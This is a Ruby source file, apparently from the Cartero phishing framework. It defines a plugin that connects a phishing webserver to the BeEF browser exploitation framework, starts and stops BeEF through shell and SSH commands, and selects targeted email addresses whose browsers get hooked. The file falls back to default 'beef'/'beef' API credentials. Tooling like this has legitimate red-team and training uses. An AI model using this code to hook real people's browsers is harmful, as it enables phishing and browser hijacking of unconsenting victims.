#encoding: utf-8
module Cartero
module Payloads
# Documentation for Beef < ::Cartero::Payload
class Beef < ::Cartero::Payload
  def initialize
    super(name: "Browser Exploitation Framework Plugin",
          description: "The command will help us hook an already created cartero webserver" +
                       ", launch beef itself, and interact with it using its API.",
          author: ["Matias P. Brutti <matias [©] section9labs.com>"],
          type: "Payload",
          license: "LGPL",
          references: [
            "https://section9labs.github.io/Cartero",
            "http://beefproject.com"
          ]
          ) do |opts|
      opts.on("-W", "--webserver WEBSERVER_FOLDER", String,
        "Sets the sinatra WebServer full path for payload creation") do |path|
        @options.path = path
        app = path.split("/")[-1]
        @options.customwebserver = path + "/" + app + ".rb"
        @options.views = path + "/views"
        @options.public_folder = path + "/static"
      end

      opts.on("-U", "--url URL", String,
        "Beef hook URL") do |url|
        @options.hook_url = url
      end

      opts.on("-D","--data FILENAME", String,
        "Filename for json email list") do |f|
        @options.json_file = f
      end

      opts.on("-L","--list FILENAME", String,
        "Filename for list of emails to hook") do |f|
        @options.list_file = f
      end

      opts.separator ""
      opts.separator "beef service commands:"

      opts.on("--start-beef", "Starts background RPC Server.") do
        @options.command = "start_beef"
      end

      opts.on("--stop-beef", "Stops background RPC Server.") do
        @options.command = "stop_beef"
      end

      opts.separator ""
      opts.separator "beef service options:"

      opts.on("--config FILENAME", String,
        "Sets a custom config file") do |c|
        @options.config = c
      end

      opts.on("--username USERNAME", String,
        "Sets username for REST client") do |u|
        @options.username = u
      end

      opts.on("--password PASSWORD", String,
        "Sets password for REST client") do |pwd|
        @options.password = pwd
      end
    end
  end

  def setup
    if @options.customwebserver.nil? && @options.command.nil?
      raise StandardError, "A webserver [--webserver /path/webserver ] must be provided"
    end

    if @options.hook_url.nil? && @options.command.nil? &&
      if ::Cartero::GlobalConfig["beef"]["hook"] != "" && !::Cartero::GlobalConfig["beef"]["hook"].nil?
        @options.hook_url = ::Cartero::GlobalConfig["beef"]["hook"]
      else
        raise StandardError, "A Beef URL [--url https://localhost:3000 ] must be provided"
      end
    end

    # Only if we are not running a basic command :-)
    if @options.command.nil?
      unless File.exist?(File.expand_path(@options.customwebserver))
        raise StandardError, "Custom WebServer file does not exists."
      end
      # Setting Default / Custom Sinatra Server.
      if @options.customwebserver.nil?
        puts "Payloads & handlers will be saved to current path"
      else
        @path = @options.path
      end
    end

    if @options.json_file
      raise StandardError, "Hooked Json data container does not exists." unless File.exist?(File.expand_path(@options.json_file))
    end

    if @options.list_file
      raise StandardError, "Hooked list file does not exists." unless File.exist?(File.expand_path(@options.list_file))
    end
    # If no list if given, everyone will be hooked.
    if @options.json_file.nil? && @options.list_file.nil? && !@options.hook_url.nil?
      $stdout.puts "NOTE: No list was provided hooking all incoming traffic."
      @options.hook_all = true
    end

    return if @options.hook_url.nil?
    #  Connect to the Beef RESTful API
    require 'cartero/beef_api'
    @rest_client = ::Cartero::BeefApi.new(
      :server => @options.hook_url,
      :username => @options.username || ::Cartero::GlobalConfig["beef"]["username"]  || "beef",
      :password => @options.password || ::Cartero::GlobalConfig["beef"]["password"]  || "beef"
    )
    @rest_client.login
    # Time to see if we were able to login.
    raise StandardError, "Something went wrong while connecting to Beef RESTful API" if @rest_client.token.nil?
  end

  def run
    run_command if @options.command
    run_hook if @options.hook_url && @options.customwebserver
  end

  private

  def run_command
    case @options.command
    when "start_beef"
      puts "Starting Beef & Beef RESTful Server"
      # Check if an ssh paramter was provided on the ~/.cartero/config was provided.
      # NOTE: This does require either you to authenticate and/or
      #       to have ssh_keys enabled for no interaction.
      #
      if ::Cartero::GlobalConfig['beef']['ssh']
        ssh = "ssh #{::Cartero::GlobalConfig['beef']['ssh_user']}@#{::Cartero::GlobalConfig["beef"]["host"]}"
      end
      # Check if a config file path was provided.
      # This will not work if you need to copy the file to the SSH. Server.
      # It is possible, but not implemented, feel free to do so and create a PR.
      if !@options.config.nil? || (!::Cartero::GlobalConfig['beef']['config'].nil? && ::Cartero::GlobalConfig['beef']['config'] != "")
        config = "--config \"#{File.expand_path(@options.config || ::Cartero::GlobalConfig['beef']['config'])}\""
      end
      # Check if we running Kali
      cmd = "#{ssh} \"bash -s\" -- < \"#{File.expand_path("../../../../data/scripts/beef/start.sh", __FILE__)}\" \"#{Cartero::GlobalConfig['beef']['path'] || 'beef' }\" #{config}"
      puts cmd
      system(cmd)
    when "stop_beef"
      ssh = "ssh #{::Cartero::GlobalConfig['beef']['ssh_user']}@#{::Cartero::GlobalConfig["beef"]["host"]}" if ::Cartero::GlobalConfig['beef']['ssh']
      puts "Stoping Beef & Beef RESTful Server"
      cmd = "#{ssh} \"bash -s\" -- < \"#{File.expand_path("../../../../data/scripts/beef/stop.sh", __FILE__)}\""
      system(cmd)
    else
      puts "Should not be here :-)"
    end
  end

  def run_hook
    require 'cartero/attack_vectors'
    list_to_hook = []
    # load list of emails to hook from json file.
    list_to_hook << JSON.parse(
      File.read(
        File.expand_path(@options.json_file)
      ),{:symbolize_names => true}
    ).map {|x| x[:email]} if @options.json_file

    # load list of emails to hook from plain text list.
    list_to_hook << File.readlines(
      File.expand_path(@options.list_file)
    ).map(&:strip) if @options.list_file

    # dump all of them ( unique list ) to the file under the customwebserver path.
    File.open(
      File.expand_path(@options.path + "/hooked_list.list"), "w"
    ) do |f|
      f << list_to_hook.uniq.join("\n")
    end
    # Adding WebServers hooks for Beef.
    @options.attack_type = "beef"
    ::Cartero::AttackVectors.new(@options).create_beef_payload
  end

  def running_kali(ssh)
    `#{ssh} uname -a` =~ /Kali/i
  end
end
end
end
